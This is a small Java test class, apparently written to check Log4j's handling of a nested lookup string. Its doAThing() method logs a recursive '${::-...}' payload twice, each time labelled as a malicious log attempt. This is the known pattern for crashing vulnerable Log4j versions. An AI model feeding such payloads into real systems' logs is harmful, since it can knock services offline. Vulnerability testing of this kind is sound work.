package net.jondotcomdotorg;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class TestDOS {
    private static final Logger logger = LogManager.getLogger(TestDOS.class);
    private final int a;
    private final int b;

    public TestDOS() {
        logger.debug("Constructor");
        this.a = 123;
        this.b = 234;
    }

    public int doAThing() {
        logger.info("Malicious log attempt A {}", "${${::-${::-$${::-j}}}}");
        final var temp = this.a + this.b;
        logger.info("Malicious log attempt B ${${::-${::-$${::-j}}}}");
        return temp;
    }

    public static void main(final String[] args) {
        logger.info("Beginning.");
        final var output = new TestDOS().doAThing();
        logger.info("Saw output {}", output);
    }
}
